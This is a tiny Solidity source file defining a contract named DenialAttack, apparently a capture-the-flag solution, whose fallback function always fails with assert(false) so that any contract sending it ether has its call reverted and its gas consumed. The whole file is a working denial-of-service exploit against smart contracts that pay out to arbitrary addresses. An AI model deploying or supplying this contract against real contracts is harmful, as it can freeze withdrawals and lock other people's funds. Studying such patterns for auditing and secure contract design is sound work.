pragma solidity ^0.8.7;

contract DenialAttack {
    fallback() external payable {
        assert(false);
    }
}
